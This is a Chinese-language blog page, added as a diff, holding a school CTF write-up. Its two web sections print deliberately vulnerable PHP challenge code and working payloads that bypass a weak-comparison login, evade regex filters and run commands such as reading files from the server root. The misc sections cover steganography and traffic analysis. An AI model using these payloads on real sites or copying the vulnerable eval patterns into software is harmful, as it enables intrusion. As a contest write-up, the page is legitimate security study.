@@ -1,0 +1,173 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="第四届海啸杯writeup"><meta name="keywords" content=""><meta name="author" content="YTsang"><meta name="copyright" content="YTsang"><title>第四届海啸杯writeup | Y. blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.8.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.8.2"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  hexoVersion: '5.2.0'
+} </script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Y. blog" type="application/atom+xml">
+</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web1"><span class="toc-number">1.1.</span> <span class="toc-text">Web1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web2"><span class="toc-number">1.2.</span> <span class="toc-text">web2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E7%9A%84%E4%B9%A6"><span class="toc-number">2.1.</span> <span class="toc-text">隐藏的书</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E8%83%BD%E7%9C%8B%E5%88%B0%E5%9B%BE%E7%89%87%E9%87%8C%E7%9A%84flag%E5%90%97"><span class="toc-number">2.2.</span> <span class="toc-text">你能看到图片里的flag吗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A5%9E%E7%A7%98%E7%9A%84%E9%93%83%E5%A3%B0"><span class="toc-number">2.3.</span> <span class="toc-text">神秘的铃声</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A5%9E%E7%A7%98%E7%9A%84%E7%BD%91%E7%AB%99"><span class="toc-number">2.4.</span> <span class="toc-text">神秘的网站</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://note.youdao.com/yws/api/personal/file/WEB4d4bfca5baf6c87d4aa15350aa33e8a7?method=download&amp;shareKey=fec53138a84367efadb03ddfa08bcb24"></div><div class="author-info__name text-center">YTsang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">20</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://file.51ppt.vip/2020/2-8/192744-1521977264b903.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Y. blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right"></span></div><div id="post-info"><div id="post-title">第四届海啸杯writeup</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-04-08</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>一次校内比赛。鸽了好久的wp，比赛的时候有事在外面，所以只做了提前放出来的题 ，复现学习下。</p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><ul>
+<li><p>题目直接给出源码，考点应该是反序列化和无参数RCE。先看第一部分，有个<code>str_shuffle()</code>函数，查一下发现是用来随机打乱的，也就是说<code>username</code>，<code>password</code>两个参数都是md5编码后随机打乱的，而后面两个参数要和反序列化后的数组比较并且要求相等，最后无参数RCE。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$username = str_shuffle(md5(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">$password = str_shuffle(md5(<span class="string">&quot;root&quot;</span>));</span><br><span class="line"></span><br><span class="line">$login = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;str&#x27;</span>])) &#123;</span><br><span class="line">    $str = $_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    $unserialize_str = unserialize($str);</span><br><span class="line">    <span class="keyword">if</span> ($unserialize_str[<span class="string">&#x27;username&#x27;</span>] == $username &amp;&amp; $unserialize_str[<span class="string">&#x27;password&#x27;</span>] == $password) &#123;</span><br><span class="line">        $login = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($login &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/highlight_file|localeconv|pos|curret|chdir|localtime|time|session|getallheaders|system|array|implode/i&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">eval</span>($_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;含有危险函数&quot;</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;不符合正则表达式&quot;</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>注意到这里的比较是属于弱比较，之前有学过弱类型比较的问题，知道<strong>bool类型的true跟任意字符串可以弱类型相等</strong>，也就是说这里只要让数组的值为bool类型的true，然后进行反序列化就能绕过。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span>=&gt;<span class="literal">true</span>,<span class="string">&quot;password&quot;</span>=&gt;<span class="literal">true</span>);</span><br><span class="line">$o = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $o;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB181ea2250cdd96881869c89c128b4a7d?method=download&shareKey=42c88190efaa5d44828e977dabc6ad83"></p>
+</li>
+<li><p>传参发现已经成功绕过，接着构造无参数RCE就行了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str&#x3D;a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;&amp;code&#x3D;cat%20&#x2F;flag;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB37a85f536ce8a89cf670fc3100fcb73c?method=download&shareKey=8f42e2d8d9ea15915d0fddafeed87ff0"></p>
+</li>
+<li><p>之前也有学过这类题，先把一些常用的函数拿出来，看一下哪些被ban了，找一下能用的函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">getcwd() 函数返回当前工作目录。</span><br><span class="line">getchwd() 函数返回当前工作目录。</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() 函数返回路径中的目录部分。</span><br><span class="line">readfile() 输出一个文件</span><br><span class="line">current() 返回数组中的当前单元, 默认取第一个值</span><br><span class="line">next()  函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">end()  将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">chr()  函数从指定的 ASCII 值返回字符。</span><br><span class="line">hex2bin()  转换十六进制字符串为二进制字符串</span><br><span class="line">getenv()  获取一个环境变量的值</span><br><span class="line">show_source()  高亮读取文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB309565579e91358445645db65af8db0c?method=download&shareKey=0879ed099356c41720470e8b46790515"></p>
+</li>
+<li><p>那就试着用上面列举能用的函数构造，看一下目录里有没有flag，用<code>getcwd()</code>获取目录，再用<code>scandir()</code>读出文件，最后用<code>print_r()</code>打印出来。成功读出目录，flag在最后。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str&#x3D;a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;&amp;code&#x3D;print_r(scandir(getcwd()));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBefbc096c94eac759efdbf80b5bebbef2?method=download&shareKey=dbf109e1655ad719b765d781402a49e6"></p>
+</li>
+<li><p>既然flag在最后，<code>end()</code>指向最后一个元素，再用<code>readfile()</code>输出就行了，最后在源码里拿到flag。</p>
+<p>flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;53ea5ab2-165f-4b23-bd25-e06db69970d8&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str&#x3D;a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;&amp;code&#x3D;readfile(end(scandir(getcwd())));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB9cf9da5f0d9a448d6086f49daad6fb84?method=download&shareKey=2d9bf859d9e7b7eeb0664f1140347a88"></p>
+</li>
+</ul>
+<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>这是一道代码审计的题</p>
+<ul>
+<li><p>直接给出源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$input</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,$input))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$input</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(is_array($input))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>($input <span class="keyword">as</span> $key=&gt;$output)&#123;</span><br><span class="line">          $input[$key] = waf($output);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      $input = check($input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">&#x27;sandbox/&#x27;</span> . md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir))&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>($_GET[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> $dir;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        $data = $_GET[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        waf($data);</span><br><span class="line">        file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>先看一下<code>file_put_contents</code>写入文件的地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action&#x3D;pwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB46b0fbfd8ca6f6711205bf63e7f93500?method=download&shareKey=162f108387614640ab28d2bfa49457a6"></p>
+</li>
+<li><p>php空格啥的都被过滤掉，尝试用%09替代空格，用短标签绕过php限制，看文件列表。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;ls%09&#x2F;&#96;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBed403fcbd0df826c47b346e18a92c5db?method=download&shareKey=a64079c668eb5ad4a48e69c4e88df282"></p>
+</li>
+<li><p>用上面得到的地址<code>/sandbox/d65ad202e966d8bef3d5042ce9e0b877/</code>看到文件列表,显然flag在最后的<code>xxxaf14gss.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bin </span><br><span class="line">boot </span><br><span class="line">dev </span><br><span class="line">etc </span><br><span class="line">home </span><br><span class="line">lib </span><br><span class="line">lib64 </span><br><span class="line">media </span><br><span class="line">mnt </span><br><span class="line">opt </span><br><span class="line">proc </span><br><span class="line">root </span><br><span class="line">run </span><br><span class="line">sbin </span><br><span class="line">srv </span><br><span class="line">sys </span><br><span class="line">tmp </span><br><span class="line">usr </span><br><span class="line">var </span><br><span class="line">xxxaf14gss.php </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>php被过滤，用通配符读，同样用上述地址读到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat%09&#x2F;xxxaf14gss.*&#96;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB2356bfb6bbfb048a15c80348696210c6?method=download&shareKey=bcb3483c79a5d3aab64e0e0d6c7965b8"></p>
+</li>
+</ul>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="隐藏的书"><a href="#隐藏的书" class="headerlink" title="隐藏的书"></a>隐藏的书</h2><ul>
+<li><p>解压出来是一份知网文献和一个txt，txt里有不可见字符。</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB6a2e9b5dd800dd03d87e8b33264348d8?method=download&shareKey=87b709ccce0e9b4199528e72ef600766"></p>
+</li>
+<li><p>题目说是隐藏的书，刚开始以为flag在是pdf里，用wbStego43open试一下解密，发现没东西,好吧应该不在pdf里，毕竟txt文件名是flag。</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB9b2754c0513f5039423a04994e9b5f1e?method=download&shareKey=48a2fc4c81e98f9dff84905a66de85b6"></p>
+</li>
+<li><p>那把txt放进binwalk，结果什么都没有。</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB595bbaa7389d28c0180b5e1cf9115e59?method=download&shareKey=b65885afe54f533374502a47ead963aa"></p>
+</li>
+<li><p>拖进kali发现有类似flag的东西</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB4cf6b2894d4be8884ce6fcbf5c96f476?method=download&shareKey=76493c043c30d30c867aeec2fecbf822"></p>
+</li>
+<li><p>给出提示，文献内容是加密方法，看了文献这段话，以为只有圈出来的这一小段。</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBec6e8c74dbfc4c46dda67fe59b0073e9?method=download&shareKey=8cef8b303ed4af9f066c30b5a32ad6df"></p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB78b1b5e3c382f6ea5c6b44539bc490c6?method=download&shareKey=3434ba34ee24d550c248eaf9084b4130"></p>
+</li>
+<li><p>文献写到的解密方法是找到对应的ASCII值，那拖进winhex看看，每个字符对应的ASCII值都是不可打印字符。</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB3bb30aacff1d4a44443e1035719326a5?method=download&shareKey=a5210b9bfaeb15657052e75fcd22362c"></p>
+</li>
+<li><p>那再看下文献，发现是两个字符对应一个英文字符，那就对了，但对应解出来只有前面一部分。</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBaefe1f3f6555d8852300616484fb2993?method=download&shareKey=2785f447840c57ea6cbc4932c804d1de"></p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB36e6ef1cd71128f96825049647d5936d?method=download&shareKey=b3133f1febe4482ca9ed0a76f3b3854e"></p>
+</li>
+<li><p>会不会是前面分析的加密区段不对，果断看了后面，发现是<code>&#125;</code>,那就对了，整个不可见字符都是flag。对照ASCII表解就得到flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8f807f74-9088-11eb-b255-00163e0620b4&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB1dcdb41342ef409e39ff26cdbf54f7b6?method=download&shareKey=2720c5c7a0b0df222d6666bb75549637"></p>
+</li>
+</ul>
+<h2 id="你能看到图片里的flag吗"><a href="#你能看到图片里的flag吗" class="headerlink" title="你能看到图片里的flag吗"></a>你能看到图片里的flag吗</h2><ul>
+<li><p>文件给了一个压缩包，解压后是两张图和一个压缩包，有一说一，这张图有点熟悉。</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBcdcb630dcff1a162cd38f430ed04e3e3?method=download&shareKey=398d3dbc89e071a2cd5214e3de176dc5"></p>
+</li>
+<li><p>题目提示flag在图里，直接丢Stegsolve看一下，直接看到flag，用红笔描出来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Th1s_1s_4_h1dden_F14g&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB16086ad5bd1fec886b68f7236bf7c50f?method=download&shareKey=a9a1348d236bdab0ba9a5d0f8a03c4cd"></p>
+</li>
+</ul>
+<h2 id="神秘的铃声"><a href="#神秘的铃声" class="headerlink" title="神秘的铃声"></a>神秘的铃声</h2><ul>
+<li><p>打开音频是一段 DTMF音频 ，有一个网站可以解，解出来是一段类似于密码的玩意</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dialabc.com&#x2F;sound&#x2F;detect&#x2F;index.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB6a31273b34f252bbe8700eeb58a8162d?method=download&shareKey=1e0bb464540b6e338eccfee8f2b98028"></p>
+</li>
+<li><p>将音频丢010editor看一下，有一个提示异常，是一段base64编码</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB6bb9a6998e53deec4c737340882ec5ee?method=download&shareKey=7abe94aa5432dbaa8ab7cb5810bd134b"> </p>
+</li>
+<li><p>解码后是一段PK开头的字符串</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBa17daf39e33ed62ef0972d04a6395065?method=download&shareKey=7face67ffdd7b1998c43c02ac16b5cf8"></p>
+</li>
+<li><p>弄成压缩包,里面有个txt文件，需要密码</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBe8ff543b57a6ff987df3a22f36f3920d?method=download&shareKey=7c01c316b6355eec73dba80593bd4415"></p>
+</li>
+<li><p>用上面的密码试下，里面是一串坐标</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB818a749c355916e11ad02d09d98c15be?method=download&shareKey=d2dc4186bc32a3f4bdcb17c90cf65d48"></p>
+</li>
+<li><p>用脚本写出图片，是一个二维码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">260</span>, <span class="number">260</span>), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">f = open(<span class="string">&#x27;flag.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    point = line.split()</span><br><span class="line">    img.putpixel((int(point[<span class="number">0</span>]), int(point[<span class="number">1</span>])), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">f.close()</span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBcc4cfa891dbdb63b4794e50a47781160?method=download&shareKey=a2e93162e804a3a1b256233165a1418f"></p>
+</li>
+<li><p>扫一下二维码就得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hsnctf&#123;8384b52d-6b32-49d8-a0be-1bb15e9985dc&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="神秘的网站"><a href="#神秘的网站" class="headerlink" title="神秘的网站"></a>神秘的网站</h2><p>这题差点做出来</p>
+<ul>
+<li><p>是个流量包，用 Wireshark 打开，提示上传包有文件，找到这个压缩包</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB57bffeb889343a0a9f9b47cbacfe98ea?method=download&shareKey=b9e41c2f944078d812e585fa0360bf6f"></p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB49325751bb52341219dc5ff7ff1ca90b?method=download&shareKey=c25c2de7a3db905c8a809b20575b22d1"></p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBf6a9c91b9abba26023204b7118ff8643?method=download&shareKey=94a969a746549f936f00ebfc71540653"></p>
+</li>
+<li><p>压缩包里有一个flag文件和一张图片</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB9f9981a14e5fbbf60ae45dc70de72efb?method=download&shareKey=197326d9494c1246e529d35f4361d878"></p>
+</li>
+<li><p>先看图片，根据提示有个chunk长度异常，丢010看一下，将数据改大，得到隐藏字符</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBc31c5dc5d6ea84247064479388072dbc?method=download&shareKey=ff177a7a5aab997b9fb2b640fb5512ef"></p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB35f52f46c20b56d14c5a54e85efc419d?method=download&shareKey=6c2d5789bbc8bd782627677d161f1c91"></p>
+</li>
+<li><p>将flag文件弄进winhex，发现是一个倒置的压缩包</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBadd61c0a6c97ecae4b6131f12738d60b?method=download&shareKey=84c8baa6a294c6a1012d77d54097a9f4"></p>
+</li>
+<li><p>脚本转换一下，得到一个加密音频</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB209dd1103d4d38d76efe03f92e4c23c6?method=download&shareKey=2640afe1a936acb1e15050b23d7ac720"></p>
+</li>
+<li><p>用图片里的密码解密，得到一段倒置的音频，用AU反置。</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB575993d490ac326ace2f30e3ede74945?method=download&shareKey=06bbaf140eff99fdcf7f0c98eb7c6bb5"></p>
+</li>
+<li><p>最后用网易云识别，在评论区拿到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;034d7bac-92b2-11eb-9310-00163e12fb24&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">YTsang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/04/08/第四届海啸杯writeup/">http://example.com/2021/04/08/第四届海啸杯writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com">Y. blog</a>！</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2021/05/08/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%9C%A8ctf%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"><i class="fa fa-chevron-left">  </i><span>PHP伪协议在ctf中的应用</span></a></div><div class="next-post pull-right"><a href="/2021/03/29/DASCTF%E4%B8%89%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0writeup/"><span>DASCTF三月赛复现writeup</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: 